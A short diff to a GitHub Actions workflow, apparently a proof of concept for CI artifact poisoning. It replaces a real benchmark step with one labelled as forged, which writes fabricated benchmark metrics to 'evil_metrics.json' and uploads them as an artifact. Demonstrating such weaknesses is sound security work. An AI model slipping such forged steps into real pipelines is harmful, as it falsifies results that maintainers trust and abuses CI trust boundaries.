@@ -14,6 +14,13 @@ jobs:
   bench:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Legit bench
-        run: echo "real benchmark run"
+      - name: Forged "benchmark" producing attacker-controlled artifacts
+        run: |
+          mkdir -p evil
+          cat > evil/evil_metrics.json <<'JSON'
+          {"name":"sp1","feat":null,"target":"sha256","input_size":1,"proof_duration":1,"verify_duration":1,"cycles":1,"proof_size":1,"preprocessing_size":1,"num_constraints":1,"peak_memory":1,"bench_properties":{"name":"sp1"}}
+          JSON
+      - uses: actions/upload-artifact@v4
+        with:
+          name: metrics-evil
+          path: evil/evil_metrics.json
